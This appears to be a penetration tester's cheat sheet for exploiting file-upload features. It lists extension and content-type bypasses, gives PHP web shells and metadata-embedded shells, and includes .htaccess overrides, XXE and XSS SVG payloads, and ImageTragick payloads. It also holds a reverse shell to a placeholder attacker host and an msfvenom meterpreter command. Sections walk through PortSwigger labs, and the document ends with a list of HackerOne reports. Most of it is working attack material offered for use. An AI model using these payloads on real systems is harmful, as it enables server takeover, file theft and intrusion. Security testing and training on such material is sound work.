- **File Upload Exploitation**
    
    - **File upload To XSS**
        
        ```jsx
        ## file upload  through XSS
        upload a picture file, intercept it, change picturename.jpg to xss payload using intruder attack
        ```
        
    
    - **Open Redirect when uploading svg files**
        
        ```xml
        <code>
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <svg
        onload="window.location='<http://www.google.com>'"
        xmlns="<http://www.w3.org/2000/svg>">
        </svg>
        </code>
        
        ```
        
```bash
# File name validation
    # extension blacklisted:
    PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
    ASP: .asp, .aspx, .cer, .asa
    Jsp: .jsp, .jspx, .jsw, .jsv, .jspf
    Coldfusion: .cfm, .cfml, .cfc, .dbm
    Using random capitalization: .pHp, .pHP5, .PhAr
    pht,phpt,phtml,php3,php4,php5,php6,php7,phar,pgif,phtm,phps,shtml,phar,pgif,inc
    # extension whitelisted:
    file.jpg.php
    file.php.jpg
    file.php.blah123jpg
    file.php%00.jpg
    file.php\\x00.jpg
    file.php%00
    file.php%20
    file.php%0d%0a.jpg
    file.php.....
    file.php/
    file.php.\\
    file.
    .html
# Content type bypass
    - Preserve name, but change content-type
    Content-Type: image/jpeg, image/gif, image/png
# Content length:
    # Small bad code:
    <?='$_GET[x]'?>
    
# Impact by extension
asp, aspx, php5, php, php3: webshell, rce
svg: stored xss, ssrf, xxe
gif: stored xss, ssrf
csv: csv injection
xml: xxe
avi: lfi, ssrf
html, js: html injection, xss, open redirect
png, jpeg: pixel flood attack dos
zip: rce via lfi, dos
pdf, pptx: ssrf, blind xxe

# Path traversal
../../etc/passwd/logo.png
../../../logo.png

# SQLi
'sleep(10).jpg
sleep(10)-- -.jpg

# Command injection
; sleep 10;

# ImageTragick | <http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html>
push graphic-context
viewbox 0 0 640 480
fill 'url(<https://127.0.0.1/test.jpg>"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context

# XXE .svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" version="1.1
<text font-size="40" x="0" y="16">&xxe;</text>
</svg>

<svg xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>

# XSS svg
<svg onload=alert(document.comain)>.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "<http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd>">
File Upload Checklist 3
<svg version="1.1" baseProfile="full" xmlns="<http://www.w3.org/2000/svg>">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert("HolyBugx XSS");
</script>
</svg>

# Open redirect svg
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='<https://attacker.com>'"
xmlns="<http://www.w3.org/2000/svg>">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
</code>
    
# Filter Bypassing Techniques
# upload asp file using .cer & .asa extension (IIS — Windows)
# Upload .eml file when content-type = text/HTML
# Inject null byte shell.php%001.jpg
# Check for .svg file upload you can achieve stored XSS using XML payload
# put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file
# Upload large size file for DoS attack test using the image.
# (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
# If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
# upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.

# Advance Bypassing techniques
# Imagetragick aka ImageMagick:
<https://mukarramkhalid.com/imagemagick-imagetragick-exploit/>
<https://github.com/neex/gifoeb>
    
# Upload file tool
<https://github.com/almandin/fuxploider>
python3 fuxploider.py --url <https://example.com> --not-regex "wrong file type"

<https://github.com/sAjibuu/upload_bypass>
```

### Fast tests

```php
<?php echo system('id'); ?>
<?php echo system($_GET['command']); ?> --> GET /example/exploit.php?command=id HTTP/1.1
```

- [ ] **[Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)**
    
    ```jsx
    Try change the Content-Type to image/jpeg 
    ```
    
- [ ] **[Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)**
    
    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    try Directory traversal
    In Burp Repeater, go to the tab containing the POST /my-account/avatar request and find the part of the request body that relates to your PHP file. In the Content-Disposition header, change the filename to include a directory traversal sequence:
    ------WebKitFormBoundaryUsapExPwh4U36YIQ
    Content-Disposition: form-data; name="avatar"; filename="exploit.php"
    Content-Type: application/octet-stream
    
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ---------------------------------------------------------
    try
    filename="..%2fexploit.php"
    ```
    
- [ ] **[Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass) [Overriding the server configuration]**
    
    ```php
    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
    Content-Disposition: form-data; name="avatar"; filename=".htaccess"
    Content-Type: text/plain
    
    	AddType application/x-httpd-php .l33t
    ------------------------------------------
    then 
    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
    Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
    Content-Type: application/octet-stream
    
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
    ```
    
- [ ] **[Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension) →** 1. `filename="exploit.php%00.jpg"`
    
- [ ] **[Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)**
    
    ```php
    exiftool.exe -Comment="<?php echo 'START ' . 'Hacked By h0tak88r :)' . ' END'; ?>" download.png -o polyglot.php
    ```
    

# Testing For File-Upload and Exploiting.

![https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp](https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp)

## Base Step

```
1. Browse the site and find each upload functionality.
2. Start with basic test by simply uploading a web shell using Weevely
	`weevely generate <password> <path>`
																	OR
	 Use Msfvenom `msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw`
3. Try the extension bypasses if that fails
4. Try changing content-type to bypass
5. Try Magic number bypass
6. Try Polygot or PNG IDAT chunks bypass
7. Finally if successful then upload small POC or exploit further.

```

## Test Case - 1: Blacklisting Bypass.

```
1. Find the upload request and send it to the repeater
2. Now start testing which extension for the file is blacklisted, change the `filename=` Parameter

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

3. Try all of this extension

**PHP** → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
**ASP** → asp, .aspx, .cer, .asa
**Jsp** → .jsp, .jspx, .jsw, .jsv, .jspf
**Coldfusion** → .cfm, .cfml, .cfc, .dbm
**Using random capitalization** → .pHp, .pHP5, .PhAr

Find more in PayloadAllThings and <https://book.hacktricks.xyz/pentesting-web/file-upload>

4. If successful then exploit further, or there might be other type of validation or
	 check so try other bypass.

```

## Test Case - 2: Whitelisting Bypass

```
1. Find the upload request and send it to the repeater
2. Now start testing which extension for the file is whitelisted, change the `filename=` Parameter

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.jpg"
Content-Type: application/x-php

3. Try all of this extension

file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\\\\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\\\\
file.php#.png
file.
.html

4. If doesn't works then try to bruteforce using intruder which extension are accepted and try again
5. If successful then exploit further, or there might be other type of validation or
	 check so try other bypass.

```

## Test Case - 3: Content-type validation

```
1. Find the upload request and send it to the repeater
2. Upload file.php and change the Content-type: application/x-php or Content-Type : application/octet-stream to Content-type: image/png or Content-type: image/gif or Content-type: image/jpg

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

3. If successful then exploit further, or there might be other type of validation or
	 check so try other bypass.

```

## Test Case - 4: Content-Length validation

```
1. Find the upload request and send it to the repeater
2. Try all three above bypass first, if they doesn't works then see if file size is been
	 checked. Try all four of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

3. Try small file payload like

<?=`$_GET[x]`?>
<?=‘ls’;   Note : <? work for “short_open_tag=On” in php.ini ( Default=On )

4. Finally the request should look like this. if this worked then try to access this file
	 For Example: <http://example.com/compromised_file.php?x=cat%20%2Fetc%2Fpasswd>

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

<?=`$_GET[x]`?>

5. Dont stop here, upload better shell and try to see if you can find something more
	 critical like DB_.

```

## Test Case - 5: Content Bypass / Using Magic Bytes

```
1. Find the upload request and send it to the repeater
2. Try all Four above bypass first, if they doesn't works then see if file content is been
	 checked. Try all five of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

3. Change the Content-Type: application/x-php to Content-Type: image/gif and Add the
	 text "GIF89a;" before you shell-code.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system($_GET['cmd']); ?>

4. Try more from here <https://en.wikipedia.org/wiki/List_of_file_signatures> and change
	 Content-Type: accordingly
5. If successful upload better Shell and POC, and see how can you increase critically.

```

## Test Case - 6: Magic Bytes and Metadata Shell

```
1. Find the upload request and send it to the repeater
2. Try all above bypass first, if they doesn't works then see if file content is been
	 checked. Try all six of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

4. First Bypass Content-Type checks by setting the value of the
	 Content-Type header to: image/png , text/plain , application/octet-stream
5. Introduce the shell inside the metadata using tool exiftool.

exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

6. Now try uploading this modified img.jpg
7. Exploit further to increase critically.

```

## Test Case - 7: Uploading Configuration Files

```
1. Find the upload request and send it to the repeater
2. Now try to upload .htaccess file if the app is using php server or else
	 try to upload .config is app is using ASP server
3. If you can upload a .htaccess, then you can configure several things and
	 even execute code (configuring that files with extension .htaccess can be executed).
	 Different .htaccess shells can be found here: <https://github.com/wireghoul/htshells>
																	OR
	 If you can upload .config files and use them to execute code. One way to do it
	 is appending the code at the end of the file inside an HTML comment: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config>
	 More information and techniques to exploit this vulnerability here: <https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/>
4. Try to exploit now that server config is changed upload the shell
	 For example if you uploaded .htaccess file with
	 AddType application/x-httpd-php .png in content this configuration would instruct
	 the Apache HTTP Server to execute PNG images as though they were PHP scripts.
5. Now simply upload our php shell file with extension .png
6. Done, try to exploit further.

```

## Test Case - 8: Try Zip Slip Upload

```
1. Find the upload request and send it to the repeater
2. Now check if .zip file is allowed to upload
3. If a site accepts .zip file, upload .php and compress it into .zip and upload it.
4. Now visit, site.com/path?page=zip://path/file.zip%23rce.php

If you also try this tool and info here: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip>

```

## Test Case -9 : Try ImageMagick

```
Check Reference : <https://hackerone.com/reports/302885> , <https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e>
1. Find the upload functionality like profile pic upload.
2. Git clone <https://github.com/neex/gifoeb> in you system.
3. Goto gifoeb directory and run this command.

./gifoeb gen 512x512 dump.gif

   This will create exploitable dump.gif file where 512x512 is pixel dimension and
	 dump.gif is an gif file.

   You can also try to bypass some checks.

	 a) ./gifoeb gen 1123x987 dump.jpg
	 b) ./gifoeb gen 1123x987 dump.png
	 c) ./gifoeb gen 1123x987 dump.bmp
	 d) ./gifoeb gen 1123x987 dump.tiff
	 e) ./gifoeb gen 1123x987 dump.tif

	(It will create the dump files with different extensions. Try with which site works)
4. After creation of exploitable files, just upload in the profile settings.
	 using modified Image files.
5. Server will return different pixel files. Download this file.
6. Save and recover the pixel files.

	for p in previews/*; do
    ./gifoeb recover $p | strings;
	done

7. More details here <https://github.com/neex/gifoeb>

########################### Another Different method #############################

Reference : <https://www.exploit-db.com/exploits/39767> , <https://hackerone.com/reports/135072>

1. Find Upload functionality.
2. Make a file with .mvg extension and add below code in it.

push graphic-context
viewbox 0 0 640 480
fill 'url(<http://example.com/>)'
pop graphic-context

Here example.com can be your burp collab url or your site were you can receive HTTP request.
3. Now use below command

convert ssrf.mvg out.png

4. Upload the image and see if you received http request.

Find ready made and more payloads here: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik>

```
# Top Upload reports from HackerOne:

1. [Remote Code Execution on www.semrush.com/my_reports on Logo upload](https://hackerone.com/reports/403417) to Semrush - 792 upvotes, $0
2. [Webshell via File Upload on ecjobs.starbucks.com.cn](https://hackerone.com/reports/506646) to Starbucks - 673 upvotes, $0
3. [Blind XSS on image upload](https://hackerone.com/reports/1010466) to CS Money - 412 upvotes, $1000
4. [Unrestricted file upload on [ambassador.mail.ru] ](https://hackerone.com/reports/854032) to Mail.ru - 404 upvotes, $3000
5. [[ RCE ] Through stopping the redirect in /admin/* the attacker able to bypass Authentication And Upload Malicious File](https://hackerone.com/reports/683957) to Mail.ru - 340 upvotes, $0
6. [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/808862) to Visma Public - 268 upvotes, $250
7. [SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]](https://hackerone.com/reports/549882) to Vimeo - 249 upvotes, $0
8. [Arbitrary File Upload to Stored XSS](https://hackerone.com/reports/808821) to Visma Public - 245 upvotes, $250
9. [Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg](https://hackerone.com/reports/1027822) to Starbucks - 225 upvotes, $0
10. [Admin Management - Login Using Default Password - Leads to Image Upload Backdoor/Shell](https://hackerone.com/reports/699030) to Razer - 199 upvotes, $200
11. [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888) to TikTok - 139 upvotes, $2727
12. [Unrestricted file upload in www.semrush.com \> /my_reports/api/v1/upload/image](https://hackerone.com/reports/748903) to Semrush - 124 upvotes, $0
13. [User can upload files even after closing his account](https://hackerone.com/reports/1020371) to Basecamp - 114 upvotes, $0
14. [XXE Injection through SVG image upload leads to SSRF](https://hackerone.com/reports/897244) to Zivver - 112 upvotes, $0
15. [Insecure file upload in xiaoai.mi.com Lead to Stored  XSS](https://hackerone.com/reports/882733) to Xiaomi - 107 upvotes, $0
16. [Unrestricted File Upload on https://partner.tiktokshop.com/wsos_v2/oec_partner/upload](https://hackerone.com/reports/1890284) to TikTok - 98 upvotes, $0
17. [[insideok.ru] Remote Command Execution via file upload.](https://hackerone.com/reports/666716) to ok.ru - 94 upvotes, $0
18. [Avatar upload allows arbitrary file overwriting](https://hackerone.com/reports/671605) to Mail.ru - 88 upvotes, $750
19. [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/880099) to GitLab - 82 upvotes, $0
20. [Unauthenticated user can upload an attachment to the last updated report draft](https://hackerone.com/reports/419896) to HackerOne - 80 upvotes, $0
21. [XSS from arbitrary attachment upload.](https://hackerone.com/reports/831703) to Qulture.Rocks - 74 upvotes, $0
22. [Open s3 bucket allows for public upload](https://hackerone.com/reports/504600) to Augur - 73 upvotes, $100
23. [SSRF and local file disclosure by video upload on https://www.redtube.com/upload](https://hackerone.com/reports/570537) to Pornhub - 61 upvotes, $500
24. [Cross site scripting via file upload in subdomain ads.tiktok.com](https://hackerone.com/reports/1433125) to TikTok - 59 upvotes, $500
25. [Unrestricted file upload when creating quotes allows for Stored XSS](https://hackerone.com/reports/788397) to Visma Public - 57 upvotes, $250
26. [Singapore - Unrestricted File Upload Leads to XSS on campaign.starbucks.com.sg/api/upload](https://hackerone.com/reports/883151) to Starbucks - 57 upvotes, $0
27. [Stored XSS on upload files leads to steal cookie](https://hackerone.com/reports/765679) to Palo Alto Software - 56 upvotes, $0
28. [SSRF and local file disclosure by video upload on https://www.tube8.com/](https://hackerone.com/reports/574133) to Pornhub - 53 upvotes, $500
29. [Unrestricted File Upload Results in Cross-Site Scripting Attacks](https://hackerone.com/reports/1005355) to Uber - 53 upvotes, $0
30. [SSRF in VCARD photo upload functionality](https://hackerone.com/reports/296045) to Open-Xchange - 49 upvotes, $850